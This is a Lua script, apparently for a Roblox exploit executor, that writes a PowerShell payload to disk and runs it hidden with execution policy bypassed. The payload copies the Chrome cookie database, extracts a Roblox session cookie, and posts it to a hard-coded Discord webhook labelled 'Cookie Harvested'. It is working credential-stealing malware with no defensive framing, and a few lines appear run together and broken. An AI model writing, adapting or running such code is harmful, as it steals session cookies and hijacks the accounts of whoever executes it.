local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571125171970899978/nWw5fZN2ZR7U-0qMwaYkyuElwrlv7N9dvzEmASGV-JXtW94LSqotIqYt6CynCRvDx-ZA"

local psPayload = [[
$webhook = "]] .. WEBHOOK_URL .. [["
$cookiePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
if (-not (Test-Path $cookiePath)) { exit }

$tempDb = "$env:TEMP\c_cache.db"
Copy-Item $cookiePath$tempDb -Force

try {
    $bytes = [System.IO.File]::ReadAllBytes($tempDb)
    $text = [System.Text.Encoding]::ASCII.GetString($bytes)
    if ($text -match "(_\|WARNING:-[^\s]+)") {
        $val = $Matches[1]$body = @{
            embeds = @(@{
                title = "Cookie Harvested"
                color = 0x2b2d31
                fields = @(@{ name = "Cookie"; value = "```text`n$val`n```"; inline = $false })
            })
        } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
    }
} catch {}
Remove-Item $tempDb -Force
]]

if writefile then
	pcall(writefile, "stepper.ps1", psPayload)
	pcall(function()
		if execute then
			execute('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "stepper.ps1"')
		elseif syn and syn.execute then
			syn.execute('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "stepper.ps1"')
		elseif process and process.create then
			process.create("powershell", {"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "stepper.ps1"})
		end
	end)
end
